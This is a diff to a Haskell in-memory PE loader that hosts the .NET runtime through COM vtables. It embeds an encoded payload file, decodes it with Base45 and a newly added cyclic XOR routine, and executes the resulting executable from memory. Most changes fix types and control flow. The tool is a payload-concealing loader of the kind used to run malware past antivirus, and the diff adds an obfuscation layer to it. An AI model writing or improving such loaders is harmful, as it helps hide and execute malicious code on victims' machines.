@@ -421,24 +421,24 @@ foreign import ccall "dynamic"
             -> (Ptr () -> Word32 -> Ptr () -> IO Int32)
 
 -- Accessors for ICLRRuntimeHostVTable methods
-pQueryInterface :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
+-- Updated Accessors to return Ptr () compatible FunPtrs
+pQueryInterface :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
 pQueryInterface ptr = peek (castPtr ptr `plusPtr` (0 * sizeOf (undefined :: FunPtr ())))
 
-pAddRef :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> IO ULONG))
+pAddRef :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO ULONG))
 pAddRef ptr = peek (castPtr ptr `plusPtr` (1 * sizeOf (undefined :: FunPtr ())))
 
-pRelease :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> IO ULONG))
+pRelease :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO ULONG))
 pRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
 
-pStart :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> IO HRESULT))
+pStart :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO HRESULT))
 pStart ptr = peek (castPtr ptr `plusPtr` (3 * sizeOf (undefined :: FunPtr ())))
 
--- Corrected pStop type: Stop returns HRESULT (Int32)
-pStop :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> IO HRESULT))
+pStop :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> IO HRESULT))
 pStop ptr = peek (castPtr ptr `plusPtr` (4 * sizeOf (undefined :: FunPtr ())))
 
-pGetDefaultDomain :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> Ptr (Ptr IUnknown) -> IO HRESULT))
-pGetDefaultDomain ptr = peek (castPtr ptr `plusPtr` (13 * sizeOf (undefined :: FunPtr ()))) 
+pGetDefaultDomain :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT))
+pGetDefaultDomain ptr = peek (castPtr ptr `plusPtr` (13 * sizeOf (undefined :: FunPtr ())))
 
 -- AppDomain GUID
 iid_AppDomain :: GUID
@@ -536,6 +536,9 @@ pGetInterface ptr = peek (castPtr ptr `plusPtr` (9 * sizeOf (undefined :: FunPtr
 pRIRelease :: Ptr ICLRRuntimeInfoVTable -> IO (FunPtr (Ptr ICLRRuntimeInfo -> IO ULONG))
 pRIRelease ptr = peek (castPtr ptr `plusPtr` (2 * sizeOf (undefined :: FunPtr ())))
 
+-- Cyclic XOR decoding
+xorDecode :: BS.ByteString -> BS.ByteString -> BS.ByteString
+xorDecode key target = BS.pack $ zipWith xor (BS.unpack target) (cycle (BS.unpack key))
 
 -- ============================================
 -- HELPER FUNCTIONS
@@ -994,6 +997,7 @@ main = do
 
   putStrLn "[*] Starting PE loader with Base45 + XOR decoding"
   let encodedPayload = $(embedFile "payload.bin")
+  
   putStrLn $ "[*] Embedded payload size: " ++ show (BS.length encodedPayload) ++ " bytes"
   putStrLn $ "[*] Secret key length: " ++ show (BS.length secretKey)
   hFlush stdout
@@ -1008,7 +1012,7 @@ main = do
       hFlush stdout
       exitFailure
     Right decoded -> do
-      putStrLn $ "[*] Base45 decoded: " ++ show (BS.length decoded) ++ " bytes"
+      putStrLn $ "[*] Base45 decoded successfully."
       hFlush stdout
       return decoded
 
@@ -1023,18 +1027,20 @@ main = do
   putStrLn "[*] Attempting to load PE from memory..."
   hFlush stdout
 
-  -- Add a timeout to the loader execution
+  -- [FIXED]: Added explicit timeout call and separated the case statement clearly
   maybeResult <- timeout loaderTimeoutMicros (try (loadPEFromMemory peBytes) :: IO (Either SomeException ()))
+  
+  -- The case statement must be aligned at the same level as maybeResult
   case maybeResult of
     Nothing -> do
       putStrLn $ "[!] PE loader timed out after " ++ show (loaderTimeoutMicros `div` 1000000) ++ " seconds."
       hFlush stdout
       exitFailure
-    Just (Left ex) -> do
-      putStrLn $ "[!] Exception during PE loading: " ++ show ex
-      hFlush stdout
-      exitFailure
-    Just (Right _) -> do
-      putStrLn "[*] PE loader finished."
-      hFlush stdout
-   hFlush stdout
+    Just result -> case result of
+      Left ex -> do
+        putStrLn $ "[!] Exception during PE loading: " ++ show ex
+        hFlush stdout
+        exitFailure
+      Right _ -> do
+        putStrLn "[*] PE loader finished."
+        hFlush stdout
